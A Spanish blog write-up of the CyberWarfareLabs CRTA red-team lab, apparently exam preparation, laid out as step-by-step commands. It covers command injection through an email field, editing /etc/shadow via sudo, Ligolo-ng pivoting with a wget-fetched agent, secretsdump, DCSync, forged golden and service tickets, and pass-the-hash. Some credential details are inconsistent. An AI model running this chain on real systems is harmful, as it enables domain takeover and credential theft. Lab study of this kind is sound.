---
layout: single
title: CRTA: Cyber Warfare Labs
excerpt: "Resolución del Laboratorio de la CRTA, donde el objetivo principal de esta Operación de Red Team es evaluar la postura de seguridad del entorno empresarial. Identificando vulnerablidades y configuraciones incorrectas en el entorno de Active Directory o web, proporcionando recomendaciones prácticas para mejorar la seguridad de la infraestructura."
date: 2026-06-21
classes: wide
header:
  teaser: /assets/images/cwl-writeup-crta/
  teaser_home_page: true
  icon: /assets/images/CWL.webp
categories:
  - CyberWarfareLabs
  - Pentesting
  - Active Directory
tags:
  - writeup
  - CRTA
  - HackingWeb
  - RCEvia-EmailTXT
  - EscaladaPrivilegios
  - Sudo
  - InformationLekeage
  - Pivoting: LigoloNG
  - DumpHashes
  - SAMdump
  - LSASecretsdump
  - AbusingConfiguration-ReplicateDCSync
  - GoldenTicket
  - SilverTicket
  - Cross-Forest
  - PassTheHash 
---

## PREPARATORIOS: SCOPE

scope de direccionamientos de red a auditar:

```bash
# COMPROBAR MI IP DE VPN (arriba derecha sale también)
ip a
-> 10.10.200.163

# COMPROBAR QUE DIRECCIONES DE RED CORREN EN LA VPN
ip route
EXTERNA -> 192.168.80.0/24
INTERNA -> 192.168.98.0/24
``` 

## WRITE UP
IP VÍCITMA-> 192.168.80.10 (TTL 63) LINUX

#### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Lab-CRTA</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

Para empezar el reconocimiento, haremos un reconocimiento con nmap para hacer un barrido de IPs a través de la IP proporcionada, a la dirección de red dentro del scope a nivel red externa:

```bash
nmap -sn 192.168.80.10 -oG ips_disponibles.txt
```

Ahora conociendo la IP enviaremos una traza ICMP para saber si tenemos conectividad con el target objetivo: (2 formas)

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

```bash
whichSystem 192.168.80.10
```

-Usar *ping*:

```bash
ping 192.168.80.10 -c1 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, nos muestra el proceso.
```

Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 192.168.80.10 -oG allPorts
# Veremos porque el formato grapeable, es importante.
```

Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

```bash
nmap -sVC -p22,80  192.168.80.10 -oN targeted
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java.
```

### ANÁLISIS SSH: RECONOCIMIENTO
Como tenemos el puerto de **ssh** abierto con *searchsploit* vamos a a buscar por la versión del servicio openssh para ver si es vulnerable. Esta versión es muy común y no es vulnerable.

```bash
searchsploit openssh 8.2p1
```

Nos centraremos en otras cosas, a ver si más adelante obtenemos alguna credencial válida.

### ANÁLISIS WEB: RECONOCIMIENTO
Como teníamos un servidor web disponible, uso el script "`http-robots.txt`" de *nmap* para ver si nos detecta algún fichero robots.txt y poder sacar algún tipo de información relevante.

En este caso no nos lo detecta, no quiere decir que no exista.

```bash
nmap -sV --script "http-robots.txt" -p80 192.168.80.10
```

Con *whatweb* haremos un reconocimiento por consola a nivel web para saber con que tecnologías, lenguaje, etc... vamos a tratar.

```bash
whatweb http://192.168.80.10/
```

Aparentemente estamos tratando con E-commerce, es un CMS conocido. Que trata sobre el proceso de comprar y vender productos o servicios a través de Internet.

Vamos a crearnos una cuenta para ver como funciona a nivel web.

credenciales a nivel usuario estandar -> test:test123

Vemos una tienda de ropa normal, cual podemos vender o comprar productos relacionados.

### BURP SUITE: CAPTURAR PETICIONES
Vamos a ponernos a la escucha con *Burp Suite* que para ello necesitamos activar el Proxy con la extensión <span style="color:lightyellow">FoxyProxy</span> que nos va a permitir capturar peticiones. 

Dentro de burp suite, "Proxy > *Intercept on*".

### RCE VIA EMAIL FIELD: REMOTE CODE EXECUTION
Vemos un campo interesante cual nos pide poner nuestro email para recibir una oferta del 10%.
Lo ponemos.

De forma paralela capturamos automáticamente la petición y la llevamos al *Repeater* para jugar con la misma.

Dentro de este, podemos probar las siguientes sintaxis para tener un RCE (Remote Code execution), que va a funcionar exitosamente:

```bash
1) EMAIL=test@test.com||id
2) EMAIL=id
```

En la salida un poco más abajo vemos que responde a nivel web, pero también a nivel sistema el comando como <span style="color:blue">www-data</span>.

Como tenemos un puerto ssh abierto vamos a leer el archivo /etc/passwd y sacar usuarios válidos a nivel sistema.

```bash
EMAIL=test@test.com||cat+/etc/passwd
```

Encontramos las siguientes credenciales:

<span style="color:blue">john</span>:<span style="color:darkred">Admin@962</span>

### ACCESO A SSH
Ahora con estas credenciales vamos a probar a acceder al ssh.

En caso contrario intentaremos leer el archivo id_rsa de algún usuario.

```bash
ssh privilege@192.168.80.10
-> privilege:Admin@962
```

Nos deja.

### TRATAMIENTO TTY
Mejoramos la shell con el siguiente comando:

```bash
export TERM=xterm
```

### ESCALADA DE PRIVILEGIOS: ABUSE SUDOERS PRIVILEGE (ALL)
Abusaremos de nuestros permisos de *sudo* para escalar privielgios. Si nos fijamos tenemos sudo en todo asi que es muy sencillo convertirnos en <span style="color:blue">root</span>.

Nos vamos al archivo <span style="color:lightblue">/etc/</span>**shadow** donde borraremos el símbolo que haya entre : y guardaremos cambios. Esto hará que el usuario root no tenga contraseña.

Ahora nos convertiremos en root y no nos pedirá contraseña.

```bash
su root
```

### INFORMATION LEKEAGE: CREDENTIALS
En la ruta actual que es el entorno personal de privilege, listando por los archivos ocultos, veremos dos elementos interesantes.

```bash
ls -a
```

Un historial de una base de datos sqlite3 y el directorio del navegador <span style="color:lightblue">.mozilla</span> .

```bash
# Lista la tablas y selecciona las columnas de la tabla moz_bookmarks
.tables
SELECT * FROM moz_bookmarks;
.quit
```

Seguimos la siguiente ruta:

Aquí nos quedaremos con la base de datos <span style="color:grey">places.sqlite</span>.

Usaremos **sqlite3** para usar dicha base de datos.

```bash
# Lista la tablas y selecciona las columnas de la tabla moz_bookmarks
.tables
SELECT * FROM moz_bookmarks;
.quit
```

Encontraremos las credenciales: 

<span style="color:blue">john</span>:<span style="color:darkred">User1@#$%6</span>

### PIVOTING: RED EXTERNA A RED INTERNA

Siendo usuarios privilegiados ya podremos realizar el pivoting. Para ello vamos a probar algunas formas para averiguar la dir. red de la red interna:

```bash
cat /var/log/auth.log | grep "Accepted"
```

No vemos que equipo de la red interna se ha conectado al ssh.

La otra forma es listando las interfaces de red que están en esta máquina. Vemos una dir. red nueva que es la 192.168.98.0/24.

### ESCANEAR IPS ACTIVAS: RED INTERNA
Nos vamos a nuestro entorno de trabajo: <span style="color:lightblue">/tmp</span> y creamos el siguiente script para hacer un barrido de IPs:

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n Saliendo...\n"
    exit 1
}

trap ctrl_c SIGINT

function scan(){
for i in {1..254}; do
    # timeout 1 envía el ping y espera solo 1 segundo la respuesta
    timeout 1 bash -c "ping -c1 192.168.98.$i" &>/dev/null &&
    echo "[+] 192.168.98.$i - ACTIVE"
done
}

scan
```

```bash
# IPs ACTIVAS EN LA RED INTERNA
192.168.98.2
192.168.98.30
192.168.98.120
```

### REQUISITOS PREVIOS: PIVOTING CON LIGOLO-NG
Usaremos *Ligolo-ng* para realizar el pivoting, pero antes haremos unos pasos obligatorios:

```bash
# CREAR NUEVA INTERFAZ DE RED LLAMADA: "Ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# ENCENDER INTERFAZ DE RED: "Ligolo"
sudo ip link set ligolo up
comprobación: ip a
```

```bash
# ELIMINAR TRÁFICO DE UNA DIR. RED DE LA VPN
[En caso de usar VPN y que vaya por ahi el trafico, borrar el trafico interno]
sudo ip route del 192.168.98.0/24 dev tun0
comprobación: ip route
```

```bash
# REDIRIGIR TRÁFICO DE LA DIR. RED INTERNA a pivotar A LA INTERFAZ "Ligolo"
sudo ip route add 192.168.98.0/24 dev ligolo
comprobación: ip route
```

### CONFIGURACIÓN LIGOLO: PROXY y AGENT
Ahora usaremos los binarios: <span style="color:lime">proxy</span> y <span style="color:lime">agent</span>.

Ambos con permisos de ejecución `chmod +x ...`.

```bash
# EJECUTAR LIGOLO EN MÁQUINA ATACANTE
[Ligolo muestra: 0.0.0.0:11601]
sudo ./proxy -selfcert
```

```bash
# EJECUAR AGENT EN MÁQUINA VÍCTIMA
[Pasarlo a máquina víctitima por servidor http]
python3 -m http.server 80
```

```bash
# COMPROBAR BINARIO wget ESTA DISPONIBLE
which wget

# DESCARGARNOS AGENT EN MAQUINA OBJETIVO
wget http://10.10.200.163/agent
```

```bash
# DAR PERMISOS DE EJECUCIÓN
chmod +x agent

# EJECUTAR AGENT Y ESTABLECER CONEXIÓN CON EL PROXY
./agent -connect 10.10.200.163:11601 -ignore-cert
```

```bash
# SELECCIONAR SESION
session > enter

# EMPEZAR COMUNICACIÓN
start
```

### RECONOCIMIENTO RED INTERNA: CONECTIVIDAD
Para comprobar que tenemos conectividad y que tenemos bien configurado Ligolo-ng, enviaremos una traza ICMP mediante ping a las IPs previamente escaneadas.

Tendremos conectividad, y saldrá que es TTL 64. Es decir Linux, pero porque pasa por el sistema cual esta alojando el ssh. Debido a que hace de puente.

### RECONOCIMIENTO RED INTERNA: ESCANEOS PUERTOS TCP: NMAP
Como quiero seguir una metodología específica y no perder tiempo en cara al examen. 

Lo primero es crearnos un fichero con todas las IPs a nivel de red interna.

```bash
192.168.98.2
192.168.98.30
192.168.98.120
```

Podremos realizar este escaneo de nmap:

```bash
nmap -p- --open --min-rate 5000 -Pn -n -vvv -iL ips_interna.txt -oN internal_tcp
```

>Metodología en esta cert. -> solo el primer escaneo suficiente.

>No hace falta diferente IP objetivo por separado, ya que perderíamos tiempo y realmente no es relevante.

### ANÁLISIS SMB: RECONOCIMIENTO
A simple vista parece una relación de confianza y que hay uno o dos DC, y un equipo normal.

La IP 192.168.98.2,120 tienen kerberos (puerto 88) y la 192.168.98.30 no.

En el escaneo de nmap tiene todos las IPs el puerto 445 abierto.

### VÁLIDAR CREDENCIALES
Usamos *netexec* para hacer un reconocimiento y validar las credenciales que encontramos al principio en el ssh.

```bash
nxc smb ips_interna.txt -u "john" -p "User1@#$%6"
```

De primeras vemos la siguiente información:

192.168.98.2 -> DC01 (Parent)

192.168.98.120 -> CDC (Child)-> Credenciales válidas sin privilegios

192.168.98.30 -> MGMT -> Credenciales Válidas con privilegios -> <span style="color:gold">(Pwn3d!)</span>

### ENUMERACIÓN USUARIOS DOMINIO
Seguidamente vamos a hacer una enumeración de usuarios para tener en mente por donde tirar.

```bash
nxc smb ips_interna.txt -u "john" -p "User1@#$%6" --rid-brute
```

>Destacan: <span style="color:blue">corpmngr</span> y <span style="color:blue">krbtgt</span>

>Más tarde los veremos por otro lado.

### RESOLUCIÓN NOMBRES LOCAL 
Antes que nada vamos al fichero <span style="color:lightblue">/etc/</span>**hosts** para asociar las IPs a los nombres, FQDN o nombre de dominio. Y no tener que recordar las IPs a cada rato. (Pondremos el del DC y CDC)

### ACCESO REMOTO CON PSEXEC
Como tenemos un usuario con privilegios sobre el equipo MGMT usaremos *psexec* para entrar y estar como <span style="color:blue">authority\system</span> por si hay algo relevante.

```bash
impacket-psexec child.warfare.corp/john@192.168.98.30
```

Dentro podemos listar los usuarios del dominio. Como este Equipo (MGMT) esta unido al dominio cdc.child.warfare.corp -> 192.168.98.120 pues nos sale sus usuarios.

```bash
net users /dom
```

Destacan: <span style="color:blue">corpmngr</span> y <span style="color:blue">krbtgt</span>

### HASHES DUMP :SAM AND LSA SECRETS DUMP
Como tenemos un usuario válido a nivel dominio con privilegios, vamos a probar de varias formas a dumpear los hashes NTLM o aes256 de los usuarios a nivel dominio y local.

La primera forma sin usar mimikatz, es usar *SecretsDump*:

```bash
impacket-secretsdump 'child.warfare.corp/jonh:User4&*&*'@192.168.98.30
```

Vemos las credenciales `corpmngr:User4&*&*` en texto claro en el campo **`_SC_SNMTRAP`** porque es el nombre con el que Windows guarda la contraseña del servicio legítimo "SNMP Trap" dentro del almacén de seguridad del LSA.

El administrador configuró ese servicio para que funcionara con una cuenta de usuario del dominio (`corpmngr`) y Windows guardó la contraseña en el LSA para poder iniciar el servicio automáticamente. 

><span style="color:blue">corpmngr</span>:<span style="color:darkred">User4&*&*</span>

La segunda forma sin usar mimikatz, es usando *netexec*:

```bash
nxc smb 192.168.98.30 -d child.warfare.corp -u john -p 'User4&*&*' --lsa
```

Ahora validaremos dichas credenciales para ver en que Equipo del dominio son válidas. 

```bash
nxc smb ips_internas.txt -u "corpmngr" -p "User4&*&*"
```

Como vimos anteriormente listando los usuarios del dominio, este usuario era del `child.warfare.corp` o `CDC`. Aparte que tenemos permisos privilegiados en este equipo.

### GOLDENT TICKET: CROSS FOREST
Como tenemos una relación de confianza en el bosque **Child** y **Parent**; Lo que podemos hacer a continuación es crear nuestro propio TGT: *Ticket Grating Ticket* (*Golden Ticket*) para autenticarnos en contra el DC01 sin conocer la cotraseña del Administrador.

Como es una relación de confianza, el usuario `krbtgt` que se encarga de firmar estos tickets pues al obtener su hash NTLM y firmar nuestro propio ticket lo usaremos para autenticarnos en el DC01 y al ser esto dicha relación, este se va a fiar.

### DCsync Attack: KRBTGT HASH NTLM
Como tenemos las credenciales del usuario <span style="color:blue">corpmngr</span> y aparentemente indica su nombre, es el manager del dominio, si es así, puede que tenga activado el protocolo **MS-DRSR** *(Microsoft Directory Replication Service (DRS) Remote Protocol)* permitiéndonos realizar el ataque *DCsynC*.

```bash
impacket-secretsdump 'child.warfare.corp/corpmngr:User4&*&*'@192.168.98.120
```

Dumpeando la base de datos **NTDS.dit** mediante el método **DRSUAPI**, obteniendo el hash NTLM del usuario <span style="color:blue">krbtgt</span>.

NTLM Hash: <span style="color:gold">e57dd34c1871b7a23fb17a77dec9b900</span>

Aes256: <span style="color:gold">ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c1  
0ab1031da11152611b2</span>

### DOMAIN'S SID: CHILD and Parent
Seguidamente con la herramienta *lookupsid* necesitaremos saber el SID del dominio Child y Parent.

Child SID Domain: <span style="color:yellow">S-1-5-21-3754860944-83624914-1883974761</span>

```bash
impacket-lookupsid 'child.warfare.corp/corpmngr:User4&*&*'@192.168.98.120
```

Parent SID Domain: <span style="color:yellow">S-1-5-21-3375883379-808943238-3239386119</span>

```bash
impacket-lookupsid 'child.warfare.corp/corpmngr:User4&*&*'@192.168.98.2
```

### CREAR TGT (Ticket Grating Ticket): GOLDEN TICKET
Con *ticketer* crearemos nuestro <span style="color:gold">Golden Ticket</span> con los valores recolectados para el usuario <span style="color:blue">corpmngr</span>:

```bash
impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'

# -aesKey -> Hash aes256 de krbtgt
# -domain-sid -> sid del domain child
# -extra-sid -> sid del domain parent
# -groups 516 -> Grupo "Domain Controllers"
# -516 -> Identificador del grupo de "Domain Controllers"
# -user-id 1106 -> Quien esta creando el ticket
# S-1-5-9 -> Permite autenticarse usando la relación de confianza con este ticket
# 'corpmngr' -> El nombre del usuario para el que se va a crear el ticket falso (puede ser inventado o real) 
```

### EXPORTAR TICKET EN VARIABLE: CARGAR TICKET EN MEMORIA
Nos dejará el ticket TGT: <span style="color:gold">corpmngr.ccache</span>

Cargaremos en memoria el ticket, mediante la siguiente variable:
```bash
export KRB5CCNAME=corpmngr.ccache
```

### SOLICITAR TGS (Ticket Grating Service): Silver Ticket
Ahora con *getST* solicitaremos un TGS para el servicio **CIFS** (Common Internet File System / SMB) del DC01 para poder usarlo seguidamente en un DCsync.

Usando el TGT creado anteriormente.

```bash
impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass 'child.warfare.corp/corpmngr' -debug
```

### EXPORTAR TICKET EN VARIABLE: CARGAR TICKET EN MEMORIA
Nos dejará el ticket TGS: Silver Ticket: <span style="color:gold">corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache</span>

Cargaremos en memoria el ticket, mediante la siguiente variable:
```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```

### Dumpear Administrator Hash NTLM: DCsync
Con **SecrectsDump** realizo el ataque DCsync dumpeando la base de datos **NTDS.dit**, obteniendo los hashes de <span style="color:blue">Administrator</span> del *DC01* mediante el *Ticket Grating Service* (Silver Ticket) del servicio CIFS previamente exportado a la la variable y cargarlo en memoria.

```bash
impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
```

>warfare -> la primera palabra del dominio DC01 -> warfare.corp

### CONECTARSE EN REMOTO: Pass The Hash (PTH)
De primeras con **netexec** válido las credenciales mediante un Pass The Hash sin necesidad de conocer la contraseña. Lo son, y como es Administrator, tengo permisos privilegiados.

```bash
nxc smb dc01.warfare.corp -u 'Administrator' -H 'a2f7b77b62cd97161e18be2ffcfdfd60'  
```

Con **psexec** nos autenticaremos como dicho Administrator haciendo un *Pass The Hash PTH*  sin necesidad de conocer la contraseña, solo con el hash.

```bash
impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60

impacket-psexec -debug 'dc01.warfare.corp/Administrator'@192.168.98.2 -hashes ':a2f7b77b62cd97161e18be2ffcfdfd60'

impacket-psexec -debug 'Administrator'@192.168.98.2 -hashes ':a2f7b77b62cd97161e18be2ffcfdfd60'
```

Convirtiéndonos en <span style="color:blue">Authority System</span> del *DC01*.

```bash
# Mirar apodo del equipo actual
hostname

# Mirar usuario actual de la sesión
whoami
```

